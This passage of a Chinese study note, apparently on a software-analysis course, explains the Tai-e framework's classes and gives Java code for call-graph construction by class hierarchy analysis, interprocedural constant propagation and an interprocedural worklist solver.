type="1"><li><p>Java语言的四种方法调用：<code>invokestatic</code>、<code>invokespecial</code>、<code>invokeinterface</code>和 <code>invokevirtual</code></p></li><li><p>Java 中的一些新特性会让方法调用的情形更复杂：比如 Java 8开始允许接口定义非抽象方法（<ahref="https://docs.oracle.com/javase/tutorial/java/IandI/defaultmethods.html">defaultmethodsopen in new window</a>）；还有从 Java 11开始，<code>invokeinterface</code> 和 <code>invoke-virtual</code>可以调用 private方法了。这都会使我们构建调用图的过程变得更复杂。</p></li><li><p>需要了解的<code>类</code></p><ol type="1"><li><p><code>pascal.taie.analysis.graph.callgraph.DefaultCallGraph</code></p><p>该类代表了程序的调用图。它提供了多样的 API（继承自类<code>AbstractCallGraph</code>）来获取到调用图的信息</p></li><li><p><code>pascal.taie.analysis.graph.callgraph.CallKind</code></p><p>该枚举类型表示调用图中边的种类，包括<code>INTERFACE</code>、<code>VIRTUAL</code>、<code>SPECIAL</code> 和<code>STATIC</code>，它对应<ahref="https://cs.nju.edu.cn/tiantan/software-analysis/Inter.pdf#page=21">第7 讲</a>中介绍过的 Java 的四种调用类型（call kind）。</p></li><li><p><code>pascal.taie.analysis.graph.callgraph.Edge&lt;Invoke,JMethod&gt;</code></p><p>该类表示调用图中的边</p></li><li><p><code>pascal.taie.ir.stmt.Invoke</code> (subclass of<code>Stmt</code>)</p><p>该类表示程序中的方法调用（举个例子：<code>x = o.m(a1,a2,…)</code>）以及调用图中的调用点</p><p>需要使用 <code>getMethodRef()</code>来获取目标方法的签名信息。</p></li><li><p><code>pascal.taie.ir.proginfo.MethodRef</code>： Tai-e中的目标方法引用，如调用点的目标方法。它包含了调用点所调用的目标方法的签名信息。</p><ol type="1"><li><code>JClass getDeclaringClass()</code>：返回该方法签名的声明类，即声明该方法的类</li><li><code>Subsignature getSubsignature()</code>：返回被调用方法的子签名（<code>subsignature</code>）。稍后介绍子签名类——<code>Subsignature</code>。</li></ol></li><li><p><code>pascal.taie.language.classes.JMethod</code></p><p>该类表示 Tai-e 中的 Java 方法。每个 <code>JMethod</code>的实例关联着一个方法并包含该方法的各种信息。</p></li><li><p><code>pascal.taie.language.classes.JClass</code></p><p>该类表示 Tai-e 中的 Java 类。每个 <code>JClass</code>的实例关联着一个类并包含该类的各种信息。</p></li><li><p><code>pascal.taie.language.classes.Subsignature</code></p></li><li><p>举个例子，下面方法 foo 的子签名是：“<code>T foo(P,Q,R)</code>”，而它的完整签名是：“<code>&lt;C: T foo(P,Q,R)&gt;</code>”。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">T</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token class-name">P</span> p<span class="token punctuation">,</span> <span class="token class-name">Q</span> q<span class="token punctuation">,</span> <span class="token class-name">R</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> … <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>pascal.taie.analysis.graph.callgraph.CHABuilder</code></p></li></ol></li></ol><h5 id="代码实现">代码实现</h5><ol type="1"><li><p>算法流程<imgsrc="https://s2.loli.net/2023/09/16/mBSvCaAtZyPwnpY.png"alt="image-20230916202239032" /></p></li><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">CallGraph</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Invoke</span><span class="token punctuation">,</span> <span class="token class-name">JMethod</span><span class="token punctuation">></span></span> <span class="token function">buildCallGraph</span><span class="token punctuation">(</span><span class="token class-name">JMethod</span> entry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// </span>       <span class="token class-name">DefaultCallGraph</span> callGraph <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultCallGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       callGraph<span class="token punctuation">.</span><span class="token function">addEntryMethod</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// TODO - check</span>       <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">JMethod</span><span class="token punctuation">></span></span> workList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       workList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>workList<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token class-name">JMethod</span> m <span class="token operator">=</span> workList<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">if</span><span class="token punctuation">(</span>callGraph<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token keyword">continue</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>           <span class="token comment">// add m to RM</span>           callGraph<span class="token punctuation">.</span><span class="token function">addReachableMethod</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// foreach call site cs in m do</span>           <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Stmt</span> stmt <span class="token operator">:</span> m<span class="token punctuation">.</span><span class="token function">getIR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStmts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span>stmt <span class="token keyword">instanceof</span> <span class="token class-name">Invoke</span> cs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                   <span class="token comment">// T = Resolve(cs)</span>                   <span class="token comment">// foreach target method m1 in T do</span>                   <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">JMethod</span> m1 <span class="token operator">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span>cs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                       <span class="token comment">// add cs->m1 to CG</span>                       callGraph<span class="token punctuation">.</span><span class="token function">addEdge</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Edge</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">CallGraphs</span><span class="token punctuation">.</span><span class="token function">getCallKind</span><span class="token punctuation">(</span>cs<span class="token punctuation">)</span><span class="token punctuation">,</span> cs<span class="token punctuation">,</span> m1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">// add m1 to WL</span>                       workList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> callGraph<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>      <span class="token comment">/**    * Resolves call targets (callees) of a call site via CHA.    */</span>   <span class="token keyword">private</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">JMethod</span><span class="token punctuation">></span></span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token class-name">Invoke</span> callSite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token comment">// TODO - check</span>       <span class="token comment">// T=&#123;&#125;</span>       <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">JMethod</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// m = method signature at cs</span>       <span class="token class-name">MethodRef</span> methodRef <span class="token operator">=</span> callSite<span class="token punctuation">.</span><span class="token function">getMethodRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">Subsignature</span> subsignature <span class="token operator">=</span> methodRef<span class="token punctuation">.</span><span class="token function">getSubsignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">JClass</span> declaringClass <span class="token operator">=</span> methodRef<span class="token punctuation">.</span><span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">JMethod</span> m <span class="token operator">=</span> declaringClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>subsignature<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// if cs is static call Then</span>       <span class="token comment">//      T = &#123;m&#125;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>callSite<span class="token punctuation">.</span><span class="token function">isStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">T</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token comment">// if cs is special call Then</span>       <span class="token comment">//      Cm = class type of m</span>       <span class="token comment">//      T = &#123;Dispatch(Cm,m)&#125;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>callSite<span class="token punctuation">.</span><span class="token function">isSpecial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">T</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">dispatch</span><span class="token punctuation">(</span>declaringClass<span class="token punctuation">,</span> subsignature<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token comment">// if cs is a virtual call or interface Then</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>callSite<span class="token punctuation">.</span><span class="token function">isVirtual</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> callSite<span class="token punctuation">.</span><span class="token function">isInterface</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">JClass</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>declaringClass<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token class-name">JClass</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token class-name">JMethod</span> dispatchMethod <span class="token operator">=</span> <span class="token function">dispatch</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> subsignature<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>dispatchMethod <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                   <span class="token class-name">T</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>dispatchMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span><span class="token function">isInterface</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                   queue<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>hierarchy<span class="token punctuation">.</span><span class="token function">getDirectSubinterfacesOf</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   queue<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>hierarchy<span class="token punctuation">.</span><span class="token function">getDirectImplementorsOf</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                   queue<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>hierarchy<span class="token punctuation">.</span><span class="token function">getDirectSubclassesOf</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> <span class="token class-name">T</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>      <span class="token comment">/**    * Looks up the target method based on given class and method subsignature.    *    * @return the dispatched target method, or null if no satisfying method    * can be found.    */</span>   <span class="token keyword">private</span> <span class="token class-name">JMethod</span> <span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token class-name">JClass</span> c<span class="token punctuation">,</span> <span class="token class-name">Subsignature</span> subsignature<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token comment">// TODO - check</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>          <span class="token class-name">JMethod</span> m <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>subsignature<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>m<span class="token punctuation">.</span><span class="token function">isAbstract</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">return</span> m<span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> <span class="token function">dispatch</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">getSuperClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> subsignature<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>在Java中,静态调用和特殊调用是两种不同的调用方式:</p><ol type="1"><li>静态调用</li></ol><p>调用静态方法时,是直接按方法签名定位并调用的,目标方法是唯一确定的。例如:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 直接调用Math类的静态max方法</span></code></pre><ol start="2" type="1"><li>特殊调用</li></ol><p>特殊调用主要包括super()、this()等,它们调用的目标方法不是固定的,需要在运行时动态确定,因此需要特殊处理。例如:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用父类构造函数,目标构造函数不是固定</span></code></pre></li></ol><h4 id="实现过程间常量传播">实现过程间常量传播</h4><ol type="1"><li><p>过程间常量传播使用了<em><code>edge transfer</code></em>，因此能够更准确地处理方法<strong>调用</strong>和<strong>返回</strong>所产生的过程间数据流。</p></li><li><p>举一个前向分析的例子，在传统的过程内数据流分析中，如果我们想计算一个节点的INfact，我们可以直接meet该节点的全部前驱的OUT fact：</p><figure><img src="https://s2.loli.net/2023/09/16/vLlxe3JBsFA4dpV.png"alt="image-20230916161718531" /><figcaption aria-hidden="true">image-20230916161718531</figcaption></figure><p>然而，在过程间数据流分析中，为了计算一个节点的 INfact，我们需要先对该节点的前驱的 OUT fact 应用 <em>edgetransfer</em>，然后把得到结果 meet 进该节点的 IN fact。</p></li><li><p>需要了解的类</p><ol type="1"><li><p><code>pascal.taie.analysis.graph.icfg.ICFGEdge</code></p><p>该类是一个抽象类，它表示了 ICFG中的边。而它有四个子类，分别关联着上一节中提到的四种 ICFG边：<code>Normal Edge</code>、<code>CallToReturnEdge</code>、<code>CallEdge</code>、<code>ReturnEdge</code></p></li><li><p><code>pascal.taie.analysis.dataflow.inter.InterDataflowAnalysis</code></p><p>这是一个过程间数据流分析的接口</p></li><li><p><code>pascal.taie.analysis.dataflow.inter.AbstractInterDataflowAnalysis</code></p><p>该抽象类实现了 <code>InterDataflowAnalysis</code>，并为<code>InterDataflowAnalysis</code> 的实现提供了一些基本的功能。</p></li><li><p><code>pascal.taie.analysis.dataflow.inter.InterConstantPropagation</code></p><p>该类继承自<code>AbstractInterDataflowAnalysis</code>，并且定义了过程间常量传播</p></li><li><p><code>pascal.taie.ir.exp.InvokeExp</code></p><p>该类表示程序中的方法调用表达式</p></li></ol></li><li><p>实验的最后你就可以发现：与保守处理方法调用的<strong>过程内</strong>常量传播相比，<strong>过程间</strong>常量传播可以达到更好的精度。</p></li><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">transferCallNode</span><span class="token punctuation">(</span><span class="token class-name">Stmt</span> stmt<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> in<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> out<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// TODO - check</span>        <span class="token keyword">boolean</span> change <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Var</span> key <span class="token operator">:</span> in<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            change <span class="token operator">|=</span> out<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> in<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> change<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">transferNonCallNode</span><span class="token punctuation">(</span><span class="token class-name">Stmt</span> stmt<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> in<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> out<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// TODO - check</span>        <span class="token keyword">return</span> cp<span class="token punctuation">.</span><span class="token function">transferNode</span><span class="token punctuation">(</span>stmt<span class="token punctuation">,</span>in<span class="token punctuation">,</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">CPFact</span> <span class="token function">transferNormalEdge</span><span class="token punctuation">(</span><span class="token class-name">NormalEdge</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> edge<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> out<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// TODO - check</span>        <span class="token keyword">return</span> out<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">CPFact</span> <span class="token function">transferCallToReturnEdge</span><span class="token punctuation">(</span><span class="token class-name">CallToReturnEdge</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> edge<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> out<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// TODO - check</span>        <span class="token class-name">CPFact</span> ret <span class="token operator">=</span> out<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LValue</span> <span class="token class-name">L</span> <span class="token operator">=</span> edge<span class="token punctuation">.</span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">orElse</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">L</span> <span class="token keyword">instanceof</span> <span class="token class-name">Var</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            ret<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">CPFact</span> <span class="token function">transferCallEdge</span><span class="token punctuation">(</span><span class="token class-name">CallEdge</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> edge<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> callSiteOut<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// TODO - check</span>        <span class="token class-name">CPFact</span> ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CPFact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span></span> formal <span class="token operator">=</span> edge<span class="token punctuation">.</span><span class="token function">getCallee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getIR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span></span> args <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Invoke</span><span class="token punctuation">)</span> edge<span class="token punctuation">.</span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInvokeExp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> formal<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Var</span> x <span class="token operator">=</span> formal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">canHoldInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                ret<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> callSiteOut<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">CPFact</span> <span class="token function">transferReturnEdge</span><span class="token punctuation">(</span><span class="token class-name">ReturnEdge</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> edge<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> returnOut<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// TODO - check</span>        <span class="token class-name">CPFact</span> ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CPFact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LValue</span> <span class="token class-name">L</span> <span class="token operator">=</span> edge<span class="token punctuation">.</span><span class="token function">getCallSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">orElse</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">L</span> <span class="token keyword">instanceof</span> <span class="token class-name">Var</span> def <span class="token operator">&amp;&amp;</span> <span class="token function">canHoldInt</span><span class="token punctuation">(</span>def<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Var</span> x <span class="token operator">:</span> edge<span class="token punctuation">.</span><span class="token function">getReturnVars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                ret<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>def<span class="token punctuation">,</span> cp<span class="token punctuation">.</span><span class="token function">meetValue</span><span class="token punctuation">(</span>ret<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>def<span class="token punctuation">)</span><span class="token punctuation">,</span> returnOut<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre></li></ol><h4 id="实现过程间-worklist-求解器">实现过程间 Worklist 求解器</h4><ol type="1"><li><p>需要了解的类</p><ol type="1"><li><p><code>pascal.taie.analysis.dataflow.fact.DataflowResult</code></p></li><li><p><code>pascal.taie.analysis.graph.icfg.ICFG</code></p><p>该类代表的是程序的过程间控制流图。</p></li><li><p><code>pascal.taie.analysis.dataflow.inter.InterSolver</code></p><p>该类是过程间数据流分析的求解器。</p></li></ol></li><li><p>Code</p><pre class="language-Java" data-language="Java"><code class="language-Java">private void initialize() &#123;        &#x2F;&#x2F; TODO - check        &#x2F;&#x2F; WL        workList &#x3D; new LinkedList&lt;&gt;(icfg.getNodes());        &#x2F;&#x2F; CG        for(Node node : icfg)&#123;            result.setOutFact(node, analysis.newInitialFact());        &#125;        icfg.entryMethods().forEach(method -&gt; &#123;            Node entry &#x3D; icfg.getEntryOf(method);            result.setOutFact(entry, analysis.newBoundaryFact(entry));        &#125;);    &#125;    private void doSolve() &#123;        &#x2F;&#x2F; TODO - check        Queue&lt;Node&gt; workList &#x3D; new LinkedList&lt;&gt;(icfg.getNodes());        while(!workList.isEmpty())&#123;            Node node &#x3D; workList.poll();            CPFact in &#x3D; new CPFact();            CPFact out &#x3D; (CPFact) result.getOutFact(node);            for(ICFGEdge&lt;Node&gt; edge : icfg.getInEdgesOf(node))&#123;                analysis.meetInto(analysis.transferEdge(edge, result.getOutFact(edge.getSource())), (Fact) in);            &#125;            if(analysis.transferNode(node, (Fact) in, (Fact) out))&#123;                icfg.getSuccsOf(node).forEach(workList::offer);            &#125;            result.setInFact(node, (Fact) in);            result.setOutFact(node, (Fact) out);        &#125;    &#125;</code></pre></li></ol><h3 id="非上下文敏感指针分析">5. 非上下文敏感指针分析</h3><h4 id="前情提要">前情提要</h4><ol 